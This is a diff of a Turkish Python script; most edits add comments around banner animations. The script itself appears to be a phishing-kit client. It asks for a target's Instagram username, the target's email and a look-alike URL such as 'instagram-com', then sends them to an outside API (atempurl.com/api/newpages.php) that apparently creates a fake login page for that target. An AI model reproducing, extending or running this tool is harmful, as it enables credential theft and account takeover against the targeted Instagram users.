@@ -1,19 +1,22 @@
 import requests, os, json, sys, time
 from colorama import Fore, Style
 
+# Gerekli modülleri indir
 os.system("clear")
 os.system("chmod +x main.py")
 os.system("pip install requests")
 os.system("clear")
 
+# İkinci animasyon
 def loading_animation():
     symbols = ["-", "|", "/", "\\"]
-    for i in range(1, 16):  # Adjusted the range for a smoother animation
+    for i in range(1, 16):
         sys.stdout.write('\r')
         sys.stdout.write('-' * i + symbols[i % len(symbols)])
         sys.stdout.flush()
-        time.sleep(0.2)  # Adjusted the sleep time for a faster animation
+        time.sleep(0.2)
 
+# İlk animasyon
 def renkli_animasyon():
     symbols = [Fore.RED + "█" + Fore.RESET, Fore.YELLOW + "█" + Fore.RESET, Fore.GREEN + "█" + Fore.RESET, Fore.BLUE + "█" + Fore.RESET]
     
@@ -23,8 +26,9 @@ def renkli_animasyon():
         sys.stdout.flush()
         time.sleep(0.2)
 
+# Animasyonu silip sadece ferit yazısını ekrana yazdırma
 def temizle_ve_yazdir(text):
-    print('\033[K' + text, end='')  # Metni temizle ve yazdır
+    print('\033[K' + text, end='')
     sys.stdout.flush()
 
 text = """
@@ -41,10 +45,10 @@ renkli_text = (
     Style.RESET_ALL
 )
 
-print(renkli_text)
-renkli_animasyon()
-os.system("clear")
-temizle_ve_yazdir(renkli_text)
+print(renkli_text) # Animasyonlu yazı
+renkli_animasyon() # Animasyonlu yazıyı yap ve bitir
+os.system("clear") # Animasyonlu yazıyı bitirdikten sonra ekranı temizle
+temizle_ve_yazdir(renkli_text) # Ekrana sadece ferit yazdırma
 
 print("""
 1--->Instagram
@@ -61,7 +65,7 @@ else:
         # Kullanıcıdan mail al
         mail = input("Mail Adresiniz--->")
 
-        # Kullanıcıdan to adresini al
+        # Kullanıcıdan Hedef Kullanıcının mail adresini al
         to = input("Hedef Kullanıcının Maili (boş bırakmak için enter'a basın)--->")
         kullanicismi = input("Hedef Kullanıcının İnstagram İsmi--->")
 
@@ -70,7 +74,7 @@ else:
         # Mail gönderme apisi kullanılmazsa devam et
         ozelurl = input("Özel Url (instagram-com gibi)--->")
         print("\033[32m|")
-        loading_animation()
+        loading_animation() # İlk animasyon
 
         api_url_sayfa = "http://smmslowy-001-site1.atempurl.com/api/newpages.php"
         params_sayfa = {"mail": mail, "userss": kullanicismi}
